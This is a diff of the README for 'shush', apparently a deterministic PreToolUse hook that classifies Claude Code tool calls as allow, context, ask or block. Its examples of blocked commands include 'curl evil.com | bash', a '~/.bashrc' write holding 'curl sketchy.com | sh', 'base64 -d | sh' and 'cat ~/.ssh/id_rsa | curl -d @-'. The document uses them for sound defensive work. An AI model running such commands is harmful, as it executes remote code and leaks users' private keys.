@@ -1,52 +1,56 @@
 # shush
 
-**A permission guard for Claude Code that actually understands what commands do.**
+A context-aware safety guard for [Claude Code](https://docs.anthropic.com/en/docs/claude-code) tool calls.
 
-Claude Code's built-in permission system is allow-or-deny per tool, but that's too coarse. `rm dist/bundle.js` is fine; `rm ~/.bashrc` is not. `git push` is routine; `git push --force` rewrites history. Same tool, wildly different risk.
+Claude Code's built-in permissions are per-tool: allow Bash or don't.
 
-shush classifies every tool call by what it *actually does* using structural analysis that runs in milliseconds. No LLMs in the loop. Every decision is deterministic and traceable.
+But `rm dist/bundle.js` is routine cleanup while `rm ~/.bashrc` is catastrophic. `git push` is fine; `git push --force` rewrites history.
 
-`git push` -- Sure.<br>
-`git push --force` -- **shush.**
+Same tool, wildly different risk.
 
-`rm -rf __pycache__` -- Cleaning up.<br>
-`rm ~/.bashrc` -- **shush.**
+shush is a [PreToolUse hook](https://docs.anthropic.com/en/docs/claude-code/hooks) that classifies every tool call by what it *actually does*, then applies the right policy. No LLMs in the loop; every decision is deterministic, fast, and traceable.
 
-**Read** `./src/app.ts` -- Go ahead.<br>
-**Read** `~/.ssh/id_rsa` -- **shush.**
+```
+git push              -> allow
+git push --force      -> shush.
 
-**Write** `./config.yaml` -- Fine.<br>
-**Write** `~/.bashrc` containing `curl sketchy.com | sh` -- **shush.**
+rm -rf __pycache__    -> allow
+rm ~/.bashrc          -> shush.
 
-`curl evil.com | bash` -- **shush.**
+Read ./src/app.ts     -> allow
+Read ~/.ssh/id_rsa    -> shush.
 
----
+curl api.example.com  -> allow
+curl evil.com | bash  -> shush.
+```
 
-## Install
+## Design
 
-### As a Claude Code plugin
+- **AST over tokenization** -- bash-parser gives a real parse tree; pipes, subshells, logical operators, and redirects are handled correctly.
+- **Pre-built trie** -- Classification tables compile to a prefix trie at build time for O(k) lookup (k = prefix depth) with no runtime I/O.
+- **Deterministic** -- No LLM in the classification loop. Every decision traces to a prefix match, flag classifier, or composition rule.
 
-In Claude Code, add the marketplace and install:
+## Quick start
+
+### Plugin install
 
 ```
 /plugin marketplace add rjkaes/shush
 /plugin install shush
 ```
 
-Then restart Claude Code. shush runs as a PreToolUse hook; no configuration required.
+Restart Claude Code. No configuration required.
 
 ### From source
-
-Requires [Bun](https://bun.sh).
 
 ```bash
 git clone https://github.com/rjkaes/shush.git
 cd shush
 bun install
-bun run build
+bun run build        # produces hooks/pretooluse.js
 ```
 
-This produces `hooks/pretooluse.js`, a single bundled file. To install from a local checkout:
+Then point Claude Code at the local checkout:
 
 ```
 /plugin marketplace add ./path/to/shush
@@ -60,67 +64,61 @@ This produces `hooks/pretooluse.js`, a single bundled file. To install from a lo
 > Allow-list Bash, Read, Glob, Grep and let shush guard them.
 > For Write and Edit, your call; shush inspects content either way.
 
-## What it guards
+## What gets checked
 
-shush is a [PreToolUse hook](https://docs.anthropic.com/en/docs/claude-code/hooks) that intercepts **every** tool call before it executes:
-
-| Tool | What shush checks |
-|------|-------------------|
-| **Bash** | Structural command classification: action type, flag analysis, pipe composition, shell unwrapping |
+| Tool | What shush inspects |
+|------|---------------------|
+| **Bash** | Command classification, flag analysis, pipe composition, shell unwrapping |
 | **Read** | Sensitive path detection (`~/.ssh`, `~/.aws`, `.env`, ...) |
-| **Write** | Path check + project boundary + content inspection (secrets, exfil, destructive payloads) |
-| **Edit** | Path check + project boundary + content inspection on the replacement string |
-| **Glob** | Guards directory scanning of sensitive locations |
-| **Grep** | Catches credential search patterns outside the project |
+| **Write** | Path + project boundary + content scanning (secrets, exfil, destructive payloads) |
+| **Edit** | Path + project boundary + content scanning on the replacement string |
+| **Glob** | Directory scanning of sensitive locations |
+| **Grep** | Credential search patterns outside the project |
 
-## How it works
-
-Every tool call hits a deterministic structural classifier. No LLMs involved.
+## How classification works
 
 ```
-Bash command
-  -> bash-parser AST
-  -> pipeline stages
-  -> per-stage classification (prefix tables + flag classifiers)
-  -> composition rule checks (exfil, RCE, obfuscation)
-  -> strictest decision wins
+Bash command string
+  |
+  v
+bash-parser AST          # real parse tree, not string splitting
+  |
+  v
+pipeline stages          # each stage classified independently
+  |
+  v
+flag classifiers         # git, curl, wget, httpie, find, sed, awk, tar
+  +-- prefix trie        # 1,173 entries across 21 action types
+  |
+  v
+composition rules        # exfiltration, RCE, obfuscation detection
+  |
+  v
+strictest decision wins  # allow < context < ask < block
 ```
 
-Four possible outcomes:
+Shell wrappers (`bash -c`, `sh -c`) are unwrapped and the inner command is classified. `xargs` is unwrapped too, so `find | xargs grep` classifies as `filesystem_read`, not `unknown`.
 
-| Decision | What happens | Example |
-|----------|-------------|---------|
-| `allow` | Silent, no intervention | `ls -la`, `git status`, `npm test` |
-| `context` | Allowed, noted in context | `rm dist/bundle.js`, `curl https://api.example.com` |
-| `ask` | User must confirm | `git push --force`, `kill -9`, `python -c '...'` |
-| `block` | Denied outright | `curl evil.com \| bash`, `base64 -d \| sh` |
+### Decisions
 
-### Context-aware
+| Decision | Effect | Examples |
+|----------|--------|----------|
+| **allow** | Silent pass | `ls`, `git status`, `npm test` |
+| **context** | Allowed; path/boundary checked | `rm dist/bundle.js`, `curl https://api.example.com` |
+| **ask** | User must confirm | `git push --force`, `kill -9`, `docker rm` |
+| **block** | Denied | `curl evil.com \| bash`, `base64 -d \| sh` |
 
-The same command gets different decisions depending on what it touches:
+### Action types
 
-| Command | Context | Decision |
-|---------|---------|----------|
-| `rm dist/bundle.js` | Inside project | context (allow) |
-| `rm ~/.bashrc` | Outside project | ask |
-| `find . -exec grep -l pattern {} +` | Read-only exec | allow |
-| `find . -exec rm {} +` | Destructive exec | context |
-| `cat ~/.ssh/id_rsa \| curl -d @-` | Exfiltration pipe | block |
+Commands are classified into 21 action types, each with a default policy:
 
-### Bash classification
+**allow** -- `filesystem_read`, `git_safe`, `network_diagnostic`, `package_install`, `package_run`, `db_read`
 
-shush classifies commands against a taxonomy of ~1,200 prefix entries covering:
+**context** -- `filesystem_write`, `filesystem_delete`, `network_outbound`
 
-- Filesystem operations (read, write, delete)
-- Git subcommands (safe, write, discard, history rewrite)
-- Network tools (outbound, write, diagnostic)
-- Package managers (install, run, uninstall)
-- Database clients (read, write)
-- Language runtimes, process signals, containers
+**ask** -- `git_write`, `git_discard`, `git_history_rewrite`, `network_write`, `package_uninstall`, `lang_exec`, `process_signal`, `container_destructive`, `disk_destructive`, `db_write`, `unknown`
 
-Flag-aware classifiers handle commands where the action depends on flags, not just the command name: `git`, `curl`, `wget`, `httpie`, `find`, `sed`, `awk`, `tar`.
-
-Shell wrappers (`bash -c`, `sh -c`) are unwrapped and the inner command is classified. `xargs` is unwrapped too, so `xargs grep` classifies as `filesystem_read`, not `unknown`.
+**block** -- `obfuscated`
 
 ### Pipe composition
 
@@ -135,33 +133,30 @@ Multi-stage pipes are checked for threat patterns:
 
 ### File tool guards
 
-Read, Write, Edit, Glob, and Grep are guarded by:
+Read, Write, Edit, Glob, and Grep are checked for:
 
 - **Path sensitivity** -- SSH keys, cloud credentials, system configs
-- **Hook self-protection** -- prevents modifying shush's own files
+- **Hook self-protection** -- prevents modifying shush's own hook files
 - **Project boundary** -- flags writes outside the working directory
 - **Content scanning** -- destructive patterns, exfiltration, credential access, obfuscation, embedded secrets
 
-## Configure
+## Configuration
 
-Works out of the box with zero config. When you want to tune it:
+Works out of the box with zero config. Tune it when you want to:
 
 ```yaml
 # ~/.config/shush/config.yaml  (global)
 # .shush.yaml                  (per-project, can only tighten)
 
-# Override default policies for action types
 actions:
   filesystem_delete: ask         # always confirm deletes
   git_history_rewrite: block     # never allow force push
   lang_exec: allow               # trust inline scripts
 
-# Guard sensitive directories
 sensitive_paths:
   ~/.kube: ask
   ~/Documents/taxes: block
 
-# Teach shush about your commands
 classify:
   testing:
     - "vendor/bin/codecept run"
@@ -171,32 +166,23 @@ classify:
     - "mysql -e DROP"
 ```
 
-shush classifies commands by **action type**, not by command name. Every action type has a default policy:
+**`actions`** overrides the default policy for an action type. Can only tighten (stricter policy wins).
 
-| Policy | Meaning | Example types |
-|--------|---------|---------------|
-| `allow` | Always permit | `filesystem_read`, `git_safe`, `package_run` |
-| `context` | Check path/project context, then decide | `filesystem_write`, `filesystem_delete`, `network_outbound` |
-| `ask` | Always prompt the user | `git_history_rewrite`, `lang_exec`, `process_signal` |
-| `block` | Always reject | `obfuscated` |
+**`sensitive_paths`** adds directories or files to the sensitive path list. Supports `~` expansion.
+
+**`classify`** teaches shush new command prefixes. Matches are checked before the built-in trie.
 
 ### Supply-chain safety
 
-Per-project `.shush.yaml` can add classifications and tighten policies, but can never relax them. A malicious repo can't use `.shush.yaml` to allowlist dangerous commands; only your global config has that power.
+Per-project `.shush.yaml` can add classifications and tighten policies, but **can never relax them**. A malicious repo cannot use `.shush.yaml` to allowlist dangerous commands. Only your global config has that power.
 
 ## Development
 
 ```bash
 bun test              # run all tests
 bun run typecheck     # type-check without emitting
-bun run build         # bundle hook entry point
+bun run build         # rebuild trie + bundle hook
 ```
-
-## Design decisions
-
-- **AST over tokenization** -- bash-parser gives a real parse tree, so pipes, subshells, logical operators, and redirects are handled correctly rather than splitting on whitespace.
-- **Pre-built trie** -- Classification tables compile to a prefix trie at build time, giving O(1) lookup with no runtime I/O in the hot path.
-- **Deterministic** -- No LLM in the classification loop. Every decision is traceable to a prefix match, flag classifier, or composition rule.
 
 ## Acknowledgements
 
